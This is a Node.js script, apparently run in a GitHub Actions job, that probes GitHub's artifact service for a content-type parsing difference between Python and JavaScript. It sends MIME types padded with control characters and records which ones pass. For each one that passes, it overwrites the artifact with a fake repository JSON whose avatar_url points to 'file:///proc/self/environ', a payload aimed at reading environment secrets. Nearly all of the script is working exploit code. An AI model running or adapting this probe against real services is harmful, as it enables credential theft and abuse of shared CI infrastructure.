import {createHash} from 'node:crypto';
import {writeFileSync} from 'node:fs';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const placeholder = Buffer.from('{"probe":"space"}');
const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
const pythonOnly = ['\u001c', '\u001d', '\u001e', '\u001f', '\u0085'];
const candidates = [];
for (const value of pythonOnly) {
  candidates.push(`${value}application/json`);
  candidates.push(`application/json${value}`);
  candidates.push(`${value}application/json; charset=utf-8`);
  candidates.push(`application/json${value}; charset=utf-8`);
}
const winners = [];

const escaped = value => value === null || value === undefined
  ? value : JSON.stringify(value).slice(1, -1);

async function create(name, mimeType) {
  try {
    const value = await client.CreateArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      version: 7,
      mimeType: StringValue.create({value: mimeType}),
    });
    return {ok: true, url: value.signedUploadUrl};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function upload(url, bytes, contentType) {
  if (!url) return false;
  await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
    blobHTTPHeaders: {blobContentType: contentType},
  });
  return true;
}

async function finalize(name) {
  try {
    const value = await client.FinalizeArtifact({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
      size: String(placeholder.length),
      hash: StringValue.create({value: hash}),
    });
    return {ok: true, id: String(value.artifactId)};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

async function inspect(name) {
  try {
    const value = await client.GetSignedArtifactURL({
      workflowRunBackendId: ids.workflowRunBackendId,
      workflowJobRunBackendId: ids.workflowJobRunBackendId,
      name,
    });
    return {ok: true, contentType: new URL(value.signedUrl).searchParams.get('rsct')};
  } catch (error) {
    return {ok: false, error: String(error).slice(0, 200)};
  }
}

function carrierBytes(repository) {
  return Buffer.from(JSON.stringify({
    full_name: repository,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette whitespace carrier',
    stargazers_count: 0,
  }));
}

async function trial(index, mimeType) {
  const name = `space-${process.env.GITHUB_RUN_ID}-${index}`;
  const created = await create(name, mimeType);
  if (!created.ok) {
    return {index, mimeType: escaped(mimeType), create: created};
  }
  await upload(created.url, placeholder, mimeType).catch(() => false);
  const final = await finalize(name);
  const view = await inspect(name);
  const raw = view.contentType ?? '';
  const jsType = raw.split(',', 1)[0].split(';', 1)[0].trim().toLowerCase();
  const isCandidate = jsType !== 'application/json';
  const row = {
    index, mimeType: escaped(mimeType),
    create: {ok: true}, final,
    view: view.ok ? {ok: true, contentType: escaped(raw)} : view,
    isCandidate,
  };
  if (isCandidate && final.id) {
    const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
    row.carrierPlaced = await upload(
      created.url, carrierBytes(repository), mimeType,
    ).catch(() => false);
    row.repository = repository;
    if (row.carrierPlaced) winners.push({id: final.id, name, repository});
  }
  return row;
}

const rows = await Promise.all(candidates.map((mimeType, index) => trial(index, mimeType)));
for (const row of rows) console.log(`SPACE ${JSON.stringify(row)}`);
const summary = {
  total: rows.length,
  accepted: rows.filter(row => row.create?.ok).length,
  candidates: rows.filter(row => row.isCandidate).length,
};
console.log(`SPACE_SUMMARY ${JSON.stringify(summary)}`);
writeFileSync('carrier-results.json', JSON.stringify({
  runId: process.env.GITHUB_RUN_ID,
  repository: process.env.GITHUB_REPOSITORY,
  winners,
  summary,
  rows,
}, null, 2) + '\n');
